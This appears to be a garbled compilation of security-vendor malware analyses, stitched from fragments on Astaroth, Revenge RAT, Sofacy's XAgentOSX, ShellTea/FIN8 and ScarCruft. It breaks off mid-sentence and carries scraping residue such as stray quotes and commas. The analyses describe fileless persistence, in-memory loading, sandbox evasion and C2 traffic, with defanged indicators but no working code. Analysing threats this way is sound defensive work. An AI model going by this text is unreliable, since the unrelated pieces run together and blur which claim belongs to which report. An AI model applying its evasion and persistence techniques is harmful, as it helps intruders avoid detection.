bytes are not of any known file type and there are no .text or other PE sections in the hex, suggesting that they are not executable There are also several log files present, and a folder called vri that is also populated with logs as the malware runs 17-2 Magic Bytes of \u201c.jpg\u201d file  Fig Some cursory analysis of one of the .dlls reveals it was \u00a0coded in Delphi, as well as use the GetLocaleInfoA function, allowing it to pull the locale information of the infected machine 18-1 Coded with Delphi  Fig 18-2 Locale Aware This problem was easily defeated by changing registry values in HKEY_CURRENT_USER>Control Panel>International to reflect a Brazilian locale, as well as enabling a Portuguese keyboard The .dlls are first registered and run using regsrv32 in silent mode A startup event is also created to gain persistence 21 ieframe.dll and IWebBrowser2 This is crucial because the malware targets Internet Explorer specifically They more than likely must be XOR-ed against a specific string, so decoding is very difficult if not impossible 23-1 Exfiltrated data  Fig 23-2 Custom encoded strings Astaroth is a particularly potent threat for South American businesses Like malicious OfficeMacros, this form of social

other utilities as Revenge RAT does recon and tries to gain a foothold in targeted computers When they succeed, RATs enable threat actors to wreak havoc, including monitoring user behavior through keyloggers or other spyware, filching personal information, and distributing other malware With redundant command and control infrastructure masked as legitimate content, threat actors can deliver a sample of Revenge RAT without leaving files on disk Revenge RAT uses a Microsoft Office Excel Worksheet with an Office macro to infect targets Scripts are run in the HTML of a custom-built blogspot.com page The complex infection chain, focus on maintaining persistence, and tactics to evade detection add up to a sophisticated threat Full Details Cofense Intelligence recently observed an email campaign delivering Revenge RAT that exhibited above- average sophistication in its delivery technique and persistence mechanisms This can enable threat actors to perform reconnaissance and establish a beachhead for further activities In this campaign, threat actors used redundant command and control infrastructure disguised as legitimate content to deliver a sample of Revenge RAT without leaving files on disk The page, 29[.]html, contains two distinct sections of scripts Breaking it Down In the example script shown in Figure 1, the first task (\u201cMS-OFFICE\u201d) is set to run a script (urGHE2PF) hosted on a secondary command and control location on pastebin every 10 minutes Figure 4: Similar code used to download Revenge RAT and inject the binary into memory Finally, the script contents of blog-page[.]html schedule the same task (\u201cMSOFFICEER\u201d) to run itself Revenge RAT used in this instance is not dropped to disk but is instead loaded into the memory of a process using the \u201cReflection.Assembly\u201d PowerShell command A similar method is used to execute the script content of the command and control locations rather than dropping the scripts to disk and then running them By scheduling tasks to run scripts and binaries in memory rather than on disk, the threat actors are able to avoid some traditional means of detection Even if the web pages are directly visited in a browser, they appear to be underdeveloped, but do not have any visible malicious (Figure 5) Figure 5: How the blog-page[.]html web page appears when visited in a browser The malicious content cannot be run in a browser; it only runs when mshta.exe is used, which also prevents the content from being recognized by most web debuggers It is only by viewing the source code of these pages that any malicious content becomes viewable (Figure 6) Figure 6: The script embedded in the blog-page[.]html web page As shown in Figure 7, decoding the script contents shown in Figure 6 reveals the same code as we saw in Figure 2, which schedules the execution of the page content By repeatedly \u201cself-scheduling\u201d the execution of the blog-page[.]html, the threat actor ensures that any content they add to this empty script section will also be executed In both cases, the threat actor can modify the hosted content at any time as needed, such as in the case of infrastructure failure or payload change Implications of This Malware The complex infection chain, redundant command and control infrastructure, focus on maintaining persistence, and attempts to evade detection exhibited by this campaign indicate an above average level of sophistication Higher levels of sophistication require higher levels of expertise and an increased understanding of the threats

Sofacy\u2019s XAgent macOS Tool", "Retrieved May 07, 2019", "Article Content During our continued research on Sofacy\u2019s Komplex Trojan, we have found a sample of a backdoor Trojan that we believe the Sofacy group uses when targeting individuals running macOS systems The backdoor Trojan authors have called it XAgentOSX, which shares the name XAgent with one of Sofacy\u2019s Windows-based Trojan and references Apple\u2019s previous name for macOS, OS X The data structure used to transmit the agent_id to the C2 is as follows: struct { DWORD random_value_for_key; CHAR[7] constant_value; DWORD agent_id; } The constant value in the data structure is a 7 byte string that is hardcoded to \u201c\\x56\\x0E\\x9F\\xF0\\xEB\\x98\\x43\u201d, followed by the agent_id value (\u201c0000\u201d in our case) The first DWORD in the data is a random value that the Trojan will use as an XOR key to encrypt the constant value and the agent_id The XAgentOSX Trojan includes responses to commands within HTML tags, which we believe allows the C2 server to format logs for viewing In most cases, the responses sent to the C2 server are included between the \u201c<font size=4 color=000066><pre>\u201d and \u201c</pre></font>\u201d HTML tags Uses the same method in \u201ctakeScreenShot\u201d function   112 stopTakeScreenShot Closes the thread created in the \u201cstartTakeScreenShot\u201d function   116

to call a callback function named _myCGEventTapCallBack when it detects pressed keys We were also unable to find any additional infrastructure based on the primary C2 location of 23.227.196[.]215 However, according to CrowdStrike, the nearby IP address 23.227.196[.]217 hosted the C2 location for an XTunnel payload used by the Sofacy group in the attack on the Democratic National Committee While these IP addresses do not directly overlap, it does appear that the Sofacy group continues to use the same hosting services to host their infrastructure Conclusion The Sofacy group continues to bolster their toolset to carry out attack campaigns on multiple platforms In this case, the threat group uses the same name XAgent for this macOS-based tool as one of their Windows-based tools Also, the macOS variant of this tool uses a similar network communications method as its Windows counterpart, which suggests this group continues to use consolidated C2 services to control compromised hosts, as we saw during our comparison of the Komplex and Seduploader (formerly referred to as Sofacy Carberp) tools Also, while we lack attack telemetry, we were able to find a loose connection to the attack campaign that Sofacy waged on the Democratic National Committee based on hosting data in both attacks Palo Alto Networks customers are protected from XAgentOSX via:  Known samples are

Posted by on June 10, 2019 During the period of March to May 2019, Morphisec Labs observed a new, highly sophisticated variant of the ShellTea / PunchBuggy backdoor malware that attempted to infiltrate a number of machines within the network of a customer in the hotel-entertainment industry", "It is believed that the malware was deployed as a result of several phishing attempts", "The last documented version of ShellTea was in 2017, ", "Given the nature of the industry targeted in the attack uncovered by Morphisec, we assume that this was also an attempted POS attack", "As the attack was prevented by the Morphisec solution, the POS malware could not be downloaded to the machines", "This is the first attack observed during 2019 that can be attributed to FIN8 with high probability, although there are a few indicators that overlap with known FIN7 attacks (URLs and infrastructure)", "In this report, we investigate this latest variant of ShellTea, together with the artifacts it downloaded after the Morphisec Labs team detonated a sample in a safe environment", "TECHNICAL DETAILS We begin by examining the different stages of the fileless dropper in detail", "FILELESS EXECUTION Registry run keys / startup folder        The attacker abuses the PowerShell wildcard mechanism with the assumption that there are no additional keys in registry under HKCU the match the S???ware string beside Software ", "This may minimize the effectiveness of certain detection or intro inspection tools when looking for the next stage execution", "The code from the [ random name ] key executes an additional PowerShell command that decodes base64 assembly and invokes it within the memory while passing it as parameters an additional [ random name ] registry value \u2013 the ShellTea shellcode: CUSTOM FUNCTION RESOLUTION ", "The hashing algorithm has a high degree of similarity to the previous ShellTea version, with a slight modification of the seeds and constants", "In this version the attacker also utilizes functions from ole32 for stream processing", "INJECT INTO EXPLORER As in the previous version, ShellTea continues the operation after persisting through the explorer.exe process", "VIRTUAL ENVIRONMENT AND SANDBOX BYPASS Virtual environment by firmware ShellTea extracts the firmware string information using NtQuerySystenInformation with the SystemFirmwareTableInformation flag", "Then it searches for a set of known strings as described in this by Checkpoint ", "Looking for monitoring processes Note that a bug in the previous version has been fixed and more CRCs were added", "The hard disk volume name is hashed with SHA1 and compared to a preconfigured SHA1", " PERSISTENCY Upon successful bypassing of sandboxes, the shellcode executes a persistency module", "If the attack is yet to be persistent (validates beforehand), it decrypts the PowerShell base64 command, then decrypts the CMD command for persistency and writes those into the registry as described in the first step", "COMMANDS It may write data/shellcode it received from the C2 into registry It may reflectively load the delivered executable into the process (and then execute it) It may create a file and execute it as a process, then mark it as deleted (after restart) It may execute the shellcode as is by creating additional thread It may execute any PowerShell command using downloaded native Empire ReflectivePicker (will be described later)", "COMMUNICATION ShellTea is proxy aware malware \u2013 if direct communication fails it will try to execute the proxy aware API", "Most of the API are standard and are mapped from wininet", "Following a decryption of the embedded domains we get the following list: At the time of the investigation, telemerty-cdn-cloud[.]host was used and mapped to 104.193.252[.]162", "Note that cdn substrings are also used in recent Fin7 attacks and it is a convenient method to bypass some of the network filters and DLP solutions", "ShellTea also uses ole32 Stream object functions (e.g", "CMemStm::Write) to manipulate the downloaded memory stream (downloaded by InternetReadFile directly into the stream)", "The C2 identifies the post request using the additional optional data that is sent immediately after the headers request using HttpSendRequestA ", "For example, in the case of ReflectivePicker download, the optional data will consist of embedded cookie and byte \u2018b\u2019 as a command", "In case a buffer needs to be sent back (in case of recon data collected on the endpoint), a magic header cookie is attached to the data and sent as is (encrypted of course) through the optional buffer", "RECON STAGE One of the first artifacts the shellcode downloads is a PowerShell code and a .NET native ReflectivePicker", "Because PowerShell was executed outside PowerShell (from within the Explorer process) it will bypass many of the blacklisting defenses", "POWERSHELL DOWNLOAD ", " Following successful collection of information, the data is send back to the C2 and the file is deleted", "EMPIRE REFLECTIVEPICKER As mentioned previously,  \u2013 it loads CLR by using CorBindToRuntime that is loaded dynamically within the shellcode", "CONCLUSION The hospitality industry, and particularly their POS networks, continues to be one of the industries most targeted by cybercrime groups", "In addition to this attack by FIN8,we\u2019ve seen multiple attacks by , and others", "Many POS networks are running on the POS version of Window 7, making them more susceptible to vulnerabilities", "What\u2019s more, attackers know that many POS systems run with only rudimentary security as traditional antivirus is too heavy and requires constant updating that can interfere with system availability", "As we see here, attack syndicates are constantly innovating and learn from their mistakes \u2013 the numerous improvements and bug fixes from the previous version of ShellTea are evident", "The techniques implemented can easily evade standard POS defenses", "Morphisec immediately prevented this attack from ever getting to the point where it could access POS endpoints", "It is lightweight, with no need for updates and does not need to be online to provide full protection", "Moreover, it serves as a compensating control for Windows 7 systems, providing a virtual patch that protects vulnerabilities.", "ScarCruft continues to evolve, introduces Bluetooth harvester By    GReAT  on\u00a0May 13, 2019", "10:00 am Executive summary After publishing our initial series of
